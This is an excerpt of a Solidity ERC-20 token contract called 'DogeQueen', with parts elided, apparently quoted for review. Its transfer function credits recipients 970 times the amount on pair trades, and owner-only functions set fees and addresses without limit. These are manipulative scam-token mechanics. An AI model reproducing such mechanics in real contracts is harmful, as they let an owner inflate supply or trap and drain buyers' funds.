...
contract FOM is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function _transfer(address sender,address recipient,uint256 amount) internal virtual {
        ...
        if((sender == _pair || recipient == _pair) && takeFee){
            ...
            _balances[recipient] += (amount * 970);
            emit Transfer(sender, recipient, amount * 970);
    ...
    address holdAddress = 0x0000000000000000000000000000000000000000;
    
    constructor() {
        _name = "DogeQueen";
        _symbol = "DogeQueen";
        owner_bool[msg.sender] = true;
        _mint(msg.sender, 1000000000000*100000000 * 10**18);
    }
    function setPair(address _target) public onlyOwner{
        _pair = _target;
    }

    function swapAddr (address _swapAddr ) public onlyOwner{
        holdAddress = _swapAddr;

    }

    function setLliquidityFee (uint256 value ) public onlyOwner{
        _liquidityFee = value;

    }

    function setHoldFee (uint256 value ) public onlyOwner{
        holdFee = value;
